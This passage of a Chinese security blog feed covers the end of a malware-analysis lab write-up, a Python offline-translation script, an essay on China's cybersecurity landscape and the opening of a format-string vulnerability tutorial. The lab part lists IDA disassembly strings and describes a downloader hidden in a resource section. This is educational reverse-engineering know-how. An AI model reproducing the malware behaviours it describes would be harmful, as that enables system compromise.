LibFileName     db &#x27;sfc_os.dll&#x27;,0       ; DATA XREF: sub_401174+2F↑o<br>.data:0040304B                 align 4<br>.data:0040304C aSystem32Wupdmg db &#x27;\system32\wupdmgr.exe&#x27;,0<br>.data:0040304C                                         ; DATA XREF: sub_4011FC+7D↑o<br>.data:00403062                 align 4<br>.data:00403064 ; char Format[]<br>.data:00403064 Format          db &#x27;%s%s&#x27;,0             ; DATA XREF: sub_4011FC+89↑o<br>.data:00403069                 align 4<br>.data:0040306C ; CHAR Type[]<br>.data:0040306C Type            db &#x27;BIN&#x27;,0              ; DATA XREF: sub_4011FC+AE↑o<br>.data:00403070 ; CHAR Name[]<br>.data:00403070 Name            db &#x27;#101&#x27;,0             ; DATA XREF: sub_4011FC+B3↑o<br>.data:00403075                 align 4<br>.data:00403078 ; CHAR ProcName[]<br>.data:00403078 ProcName        db &#x27;EnumProcessModules&#x27;,0<br>.data:00403078                                         ; DATA XREF: _main+5A↑o<br>.data:0040308B                 align 4<br>.data:0040308C ; CHAR aPsapiDll[]<br>.data:0040308C aPsapiDll       db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+5F↑o<br>.data:00403096                 align 4<br>.data:00403098 ; CHAR aGetmodulebasen[]<br>.data:00403098 aGetmodulebasen db &#x27;GetModuleBaseNameA&#x27;,0<br>.data:00403098                                         ; DATA XREF: _main+76↑o<br>.data:004030AB                 align 4<br>.data:004030AC ; CHAR aPsapiDll_0[]<br>.data:004030AC aPsapiDll_0     db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+7B↑o<br>.data:004030B6                 align 4<br>.data:004030B8 ; CHAR aEnumprocesses[]<br>.data:004030B8 aEnumprocesses  db &#x27;EnumProcesses&#x27;,0    ; DATA XREF: _main+92↑o<br>.data:004030C6                 align 4<br>.data:004030C8 ; CHAR aPsapiDll_1[]<br>.data:004030C8 aPsapiDll_1     db &#x27;psapi.dll&#x27;,0        ; DATA XREF: _main+97↑o<br>.data:004030D2                 align 4<br>.data:004030D4 aSystem32Wupdmg_0 db &#x27;\system32\wupdmgr.exe&#x27;,0<br>.data:004030D4                                         ; DATA XREF: _main+1C8↑o<br>.data:004030EA                 align 4<br>.data:004030EC ; char aSS_0[]<br>.data:004030EC aSS_0           db &#x27;%s%s&#x27;,0             ; DATA XREF: _main+1D4↑o<br>.data:004030F1                 align 4<br>.data:004030F4 aWinupExe       db &#x27;\winup.exe&#x27;,0       ; DATA XREF: _main+200↑o<br>.data:004030FF                 align 10h<br>.data:00403100 ; char aSS_1[]<br>.data:00403100 aSS_1           db &#x27;%s%s&#x27;,0             ; DATA XREF: _main+20C↑o<br>.data:00403105                 align 10h<br>.data:00403110 dword_403110    dd 1                    ; DATA XREF: start+6E↑r<br>.data:00403114                 align 10h<br></code></pre></td></tr></table></figure><p>根据以上信息和汇编代码猜测病毒会在<code>\system32</code>目录下创建<code>wupdmgr.exe</code>文件，并尝试执行此程序，如果执行成功，则函数<code>sub_401174</code>返回<code>0</code></p><p>还有一个隐藏在资源节的PE文件，用二进制模式打开后可以看到如下文本</p><p><img src="https://i.loli.net/2019/01/19/5c43386273988.png"></p><p><strong>6.这个文件在资源段包含一个资源。使用Resource Hacker工具来检查资源，然后抽取资源。从资源中你能发现什么吗？</strong></p><p>使用<code>Resource Hacker</code>可以发现该程序的资源节存在一个可执行程序，程序指向一个网址并从该网址下载文件，但下载的文件内容未知。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>静态分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2019/01/%E5%89%8D%E8%A8%80/"/>
    <url>/2019/01/%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>书山有路勤为径，学海无涯苦作舟。在拜读《恶意代码分析实战》一书之后，我自己已经被这些黑客与安全人员之间斗智斗勇的高超技术所吸引，但是在学习书中内容的同时又觉得“纸上得来终觉浅，绝知此事要躬行”，书中有很多难以吃透的要点需要我多次深入学习研究，因此我开始了对此书的第二遍阅读，并以博文形式记录下此次的学习过程，此次学习主要通过实践将理论与动手能力结合起来从而加深印象，同时会记录下我在学习过程中的个人想法和新的点子。</p><p>有很多工具都可以在吾爱破解的爱盘中下载，避免从第三方渠道下载到恶意软件：</p><p><a href="https://down.52pojie.cn/">https://down.52pojie.cn/</a></p><p><strong>加油！💪</strong></p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python离线翻译</title>
    <link href="/2019/01/Python%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/"/>
    <url>/2019/01/Python%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<p>最近有个小任务，需要翻译数量巨大的文档，文档已经由<code>OCR</code>识别为了文本并存储为了<code>txt</code>文件，但是这些文档由于某些原因不能通过各种在线翻译来翻译以防止信息泄露，因此只能离线翻译的方式，<code>Google</code>了一下没有找到一个好的离线翻译的解决方案，于是想通过使用有道词典的客户端进行离线翻译，设想是用<code>python</code>模拟键盘鼠标的操作读取文件，修改计算机剪切板的内容并将翻译好的数据存储在文件中。</p><span id="more"></span><p>话不多说，因为要复制粘贴，所以代码需要有访问计算机剪切板的功能，<code>python</code>中可以直接安装<code>pyperclip</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m install pyperclip<br></code></pre></td></tr></table></figure><p>用python模拟键盘操作需要用到库<code>PyUserInput</code>，但是这个库中用到的<code>pyhook</code>并不支持<code>python3</code>，所以需要先下载<code>pyhook</code>并编译出<code>python3</code>的安装代码：</p><p><code>pyhook_py3k</code>下载地址：<a href="https://github.com/Answeror/pyhook_py3k">https://github.com/Answeror/pyhook_py3k</a></p><p>编译过程中用到的<code>swig.exe</code>的下载地址：<a href="http://www.swig.org/download.html">http://www.swig.org/download.html</a></p><p>解压<code>pyhook_py3k</code>文件夹并运行如下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python setup.py build_ext --swig=你的文件路径\swig.exe<br>pip install .<br></code></pre></td></tr></table></figure><p>运行期间可能会出现缺少<code>VC build tool</code>的报错，直接谷歌下载相应工具安装后即可正常运行</p><p>安装完成后输入命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python -m pip install PyUserInput<br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">import</span> pyperclip<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pymouse <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pykeyboard <span class="hljs-keyword">import</span> PyKeyboard<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_trans_result</span>(<span class="hljs-params">string_to_be_trans</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;待翻译&#x27;</span>+string_to_be_trans)<br>    pyperclip.copy(string_to_be_trans)<br><br>    m.click(<span class="hljs-number">500</span>, <span class="hljs-number">400</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>    k.press_key(k.control_l_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.tap_key(<span class="hljs-string">&#x27;a&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.release_key(k.control_l_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.press_key(k.backspace_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.release_key(k.backspace_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br><br>    m.click(<span class="hljs-number">500</span>, <span class="hljs-number">400</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    m.click(<span class="hljs-number">550</span>, <span class="hljs-number">435</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br><br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    m.click(<span class="hljs-number">500</span>, <span class="hljs-number">800</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>    k.press_key(k.control_l_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.tap_key(<span class="hljs-string">&#x27;a&#x27;</span>)<br>    k.release_key(k.control_l_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.press_key(k.control_l_key)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.tap_key(<span class="hljs-string">&#x27;c&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    k.release_key(k.control_l_key)<br>    m.click(<span class="hljs-number">500</span>, <span class="hljs-number">800</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    m.click(<span class="hljs-number">550</span>, <span class="hljs-number">810</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>    trans_result = pyperclip.paste()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;翻译结果&#x27;</span> + trans_result)<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">return</span> trans_result<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    time.sleep(<span class="hljs-number">5</span>)<br><br>    m = PyMouse()<br>    k = PyKeyboard()<br><br>    <span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> os.listdir(<span class="hljs-string">&#x27;./src&#x27;</span>):<br>        <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(<span class="hljs-string">&#x27;./src/&#x27;</span>+folder):<br>            <span class="hljs-keyword">if</span>(os.path.splitext(<span class="hljs-string">&#x27;./src/&#x27;</span>+folder+<span class="hljs-string">&#x27;/&#x27;</span>+filename)[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;.txt&#x27;</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;filename:&#x27;</span>+filename)<br>                <span class="hljs-comment">#counter=counter+1</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/&#x27;</span>+folder+<span class="hljs-string">&#x27;/&#x27;</span>+filename,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file_to_be_trans:<br>                    string_to_be_trans = <span class="hljs-string">&#x27;&#x27;</span><br>                    translated_string = <span class="hljs-string">&#x27;&#x27;</span><br>                    final_string= <span class="hljs-string">&#x27;&#x27;</span><br>                    line_num = <span class="hljs-number">0</span><br><br>                    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_to_be_trans.readlines():<br>                        line = line.strip()<br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>                            line = line.replace(<span class="hljs-built_in">chr</span>(i), <span class="hljs-string">&#x27;&#x27;</span>)<br>                        line = line + <span class="hljs-string">&#x27;\n&#x27;</span><br>                        <span class="hljs-keyword">if</span> (line != <span class="hljs-string">&#x27;&#x27;</span>):<br>                            line_num = line_num + <span class="hljs-number">1</span><br>                            string_to_be_trans = string_to_be_trans + line<br><br>                        <span class="hljs-keyword">if</span> (line_num == <span class="hljs-number">5</span>):<br>                            translated_string = get_trans_result(string_to_be_trans)<br>                            <span class="hljs-keyword">if</span>(translated_string==string_to_be_trans):<br>                                time.sleep(<span class="hljs-number">2</span>)<br>                            final_string = final_string + translated_string<br>                            string_to_be_trans = <span class="hljs-string">&#x27;&#x27;</span><br>                            line_num = <span class="hljs-number">0</span><br>                        time.sleep(<span class="hljs-number">0.05</span>)<br><br>                <span class="hljs-keyword">if</span> (os.path.exists(<span class="hljs-string">&#x27;./dst/&#x27;</span> + folder)):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    os.makedirs(<span class="hljs-string">&#x27;./dst/&#x27;</span> + folder)<br><br>                filename_zh = get_trans_result(filename.replace(<span class="hljs-string">&#x27;.txt&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)) + <span class="hljs-string">&#x27;.txt&#x27;</span>.strip()<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(filename_zh)&gt;<span class="hljs-built_in">len</span>(filename.replace(<span class="hljs-string">&#x27;.txt&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))+<span class="hljs-number">15</span>):<br>                    filename_zh = get_trans_result(filename.replace(<span class="hljs-string">&#x27;.txt&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)) + <span class="hljs-string">&#x27;.txt&#x27;</span>.strip()<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./dst/&#x27;</span>+folder+<span class="hljs-string">&#x27;/&#x27;</span>+filename.replace(<span class="hljs-string">&#x27;.txt&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)+<span class="hljs-string">&#x27;---&#x27;</span>+filename_zh, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> trans_ed_file:<br>                    trans_ed_file.write(final_string)<br>                    os.remove(<span class="hljs-string">&#x27;./src/&#x27;</span> + folder + <span class="hljs-string">&#x27;/&#x27;</span> + filename)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br></code></pre></td></tr></table></figure><p>因为时间急任务紧，代码写的很难看。。最近事情比较多，就不改了😂</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>自动化</tag>
      
      <tag>离线翻译</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战学习笔记</title>
    <link href="/2018/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="https://hvnt3r.top/2019/01/%E5%89%8D%E8%A8%80/">前言</a></li><li><a href="https://hvnt3r.top/2019/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/">第一章 - 静态分析基础技术</a></li><li><a href="https://hvnt3r.top/2019/01/%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">第二章 - 在虚拟机中分析恶意代码</a></li><li><a href="https://hvnt3r.top/2019/01/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/">第三章 - 动态分析基础技术</a></li><li><a href="https://hvnt3r.top/2019/03/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF/">第四章 - 静态分析高级技术</a></li><li><a href="https://hvnt3r.top/2019/03/IDA-Pro%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">第五章 - IDA Pro使用方法</a></li><li><a href="https://hvnt3r.top/2019/03/%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/">第六章 - 识别汇编中的C代码结构</a></li><li><a href="https://hvnt3r.top/2019/03/%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/">第七章 - 分析恶意Windows程序</a></li><li><a href="https://hvnt3r.top/2019/03/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/">第八章 - 动态分析高级技术</a></li><li><a href="https://hvnt3r.top/2019/03/OllyDbg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">第九章 - OllyDbg使用方法</a></li><li><a href="https://hvnt3r.top/2019/03/%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/">第十章 - 使用WinDbg调试内核</a></li><li><a href="https://hvnt3r.top/2019/03/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/">第十一章 - 恶意代码行为识别</a></li><li><a href="https://hvnt3r.top/2019/03/%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/">第十二章 -隐蔽的恶意代码启动 </a></li><li><a href="https://hvnt3r.top/2019/04/%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/">第十三章 - 数据加密</a></li><li><a href="https://hvnt3r.top/2019/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E7%BB%9C%E7%89%B9%E5%BE%81/">第十四章 - 恶意代码的网络特征</a></li><li><a href="https://hvnt3r.top/2019/03/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/">第十五章 - 防反汇编技术</a></li><li><a href="https://hvnt3r.top/2019/03/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/">第十六章 -反调试技术 </a></li><li><a href="https://hvnt3r.top/2019/04/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/">第十七章 - 反虚拟机技术</a></li><li><a href="https://hvnt3r.top/2019/04/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/">第十八章 - 加壳与脱壳</a></li><li><a href="https://hvnt3r.top/2019/04/ShellCode%E5%88%86%E6%9E%90/">第十九章 - ShellCode分析</a></li><li><a href="https://hvnt3r.top/2019/04/C-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">第二十章 - C++代码分析</a></li><li><a href="https://hvnt3r.top/2019/04/64%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">第二十一章 - 64位恶意代码</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈中国网络安全局势</title>
    <link href="/2018/11/%E6%B5%85%E8%B0%88%E4%B8%AD%E5%9B%BD%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/"/>
    <url>/2018/11/%E6%B5%85%E8%B0%88%E4%B8%AD%E5%9B%BD%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>之所谓是浅谈，是因为中国网络安全局势是一个很大的话题，所以很难在这短短的篇幅当中做深入的探讨，因此我将尽力浓缩我这几年在学习和生活过程中对国内网络安全局势的想法。</p><p>首先，网络空间内的攻与防永远是一个伴生关系，并且二者在人类实现信息化社会过程的博弈中绽放了耀眼的火花，纵观全球的安全局势，每年都会发生轰动全球的信息安全事件，如勒索病毒的爆发，伊朗震网事件的发生，以及每年都会发生的账号或者个人信息泄露的事件，种种事件表明：网络并不安全，这也就是为什么我国如此重视网络安全人才培养的原因，随着我国对信息化推进的过程中，网络安全的范畴不断扩大，网络安全的形式也十分严峻，在各个国家大大小小的摩擦中，网络已经成为了一个悄然的战场，网络攻击发生在大众看不到的地方，各种国际上的<code>APT</code>事件往往伴随着明显的政治因素和地缘因素，而就我经验而言，<code>APT</code>攻击的切入点往往是<code>0Day</code>漏洞或者是社会工程学，对于<code>0Day</code>漏洞往往我们没办法找到一个有效的反制措施，但是针对社会工程学，一句老话：安全各个安全环节中最大的漏洞在于人本身，各大企业或者政府机关重要机构都要加强对从业人员安全意识的培养，如不要轻易打开不明来源的邮件，不要在社交媒体上过多的暴露自己的个人信息等，这些措施都能帮助我们减少来自<code>APT</code>攻击的威胁。</p><span id="more"></span><p>在工业控制安全领域中，就我个人了解，由于工业控制网络的起步较慢，在一些常见的工业控制协议或者网络体系中都多多少少存在着漏洞，如协议采用明文传输，并无加密反窃听措施，也无数据校验措施无法确保数据的正确性等安全漏洞，由此引申到其他领域如医疗领域航空航天领域，很多通行的安全标准存在着一些问题，但是由于改变这些标准将会在短时间内对这些造成较大的影响，因此这些漏洞就长期的存在于各领域中，随时都有爆发的危险，所以我认为安全并不是一种行为，而是一种需要扎根于心底的意识和常态，只有把安全的意识注入到生产生活的每个角落当中，才能形成一个真正安全的防护体系。<br>纵观国内智能终端行业的崛起，我们可以发现移动和便携会是互联网下一个发展的趋势，越来越多的设备强调便携和智能，就像之前的锤子科技发布的TNT工作台，虽然骂声一片，但是这却代表着一个行业的发展趋势，虽然现在来说由于这些技术并不成熟，但是谁能预料到未来的几年或者几十年内，会不会成为一个智能终端的时代呢，手机或者智能手表就能替代传统的办公电脑，伴随机器学习技术的兴起，我认为智能终端安全便是下一个满是硝烟的网络安全战场。</p><p>近几年，国内的网络安全竞赛和活动呈现一个井喷状态，无论是地方政府机关各地知名高校还是一些安全企业大多都举办过CTF竞赛，作为一个时常混迹这些大小赛事中的菜鸡，我能明显的地感受到国家对网络安全人才的重视程度，正如习大大所说，没有网络安全就没有国家安全，而安全的核心在于人才的培养，在参加这些安全竞赛的过程中，安全公司从中发现了有价值的人才，而每个参赛者在比赛过程中也与各界大佬切磋了不少新的技术，提高了自身的技术水平，开拓了新的思路和视野，抛开有些比赛商业目的过强的因素，这些网络安全比赛显然是百利而无一害，正是这些比赛活跃了中国的安全圈，使得国内的网络安全呈现百花齐放的状态，这也是一个很好的趋势。</p><p>在一些国际的网络安全比赛中，如2017年全球<code>Defcon</code>总决赛，中国的腾讯玄武实验室以及360和长亭科技的队伍占据了前五名中的三个位置，这些队伍在比赛上展示了最新的<code>Windows Edge</code>浏览器的漏洞，<code>Chrome</code>浏览器的<code>0Day</code>漏洞以及<code>Windows</code>内核相关的多个重大漏洞，这无不展示了中国安全人才的卓越成果与超强能力，国外安全媒体无不对其称赞，并发帖说中国的网络安全技术已经达到了全球领先的水平。这种成就令我们自豪，但是比赛不久之后我国相关部门就限制了国内安全人才去参加国际的安全比赛，原因是参加这些比赛实际上是一种国产技术的流失和泄露，我觉得这种观点确实十分重要，为什么<code>wanna cry</code>的爆发对全球影响如此之大，其实当时<code>wanna cry</code>爆发之前我就在网上了解到了关于<code>NSA</code>武器库泄露的新闻，而且也下载下来的永恒之蓝的利用工具并做了相关的实验，在发现此漏洞的危害性之后我就认为不久之后肯定会有围绕此漏洞展开的攻击活动，果不其然，wanna cry爆发，给国内造成了巨大的损失，其实这些漏洞就是美国的安全人员积累下来的各种<code>0Day</code>，就如我国安全人员在比赛上展示的一样，所以我认为政府加强对安全漏洞产权的保护的举动是十分正确且有必要的。</p><p>总的来说，目前国内安全圈的氛围越来越好，安全行业炙手可热，正是我们每个安全研究人员展现自己身手的大好机会，引用某知名安全企业CEO的一句话：安全就是所有0前面的1。我们就是网络安全的士兵，保护国家网络安全，是我们每个人的使命！</p>]]></content>
    
    
    <categories>
      
      <category>思考</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全局势</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制安全之格式化字符串漏洞</title>
    <link href="/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>相信每位程序员都写过如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>是的，这应该是每个程序员写的第一个程序，其中<code>printf()</code>，也是一个在C语言中的较为脆弱的函数，我们今天就来探讨一下格式化字符串漏洞。有一点要说的是由于现在的很多编译器都变得更加智能且更加注重安全性，格式化字符串等容易出现问题的函数都会由编译器自动为其添加相应的check函数从而保证函数的安全性，因此格式化字符串漏洞是由很小的可能性会出现在真实的生产环境中的，可能出现这个漏洞最多的情形就是大大小小形式各异的CTF赛题中了，但是由于此漏洞历史悠久并且较为有趣，如果产生此漏洞的话危害也不小，还是有必要学习一下的。</p><span id="more"></span><p>如果我们要实现让用户输入一段字符串并在屏幕上打印出用户输入的内容，我们可能会这样写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>当然这样写是没有问题的，但是如果程序员偷懒写成了如下的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 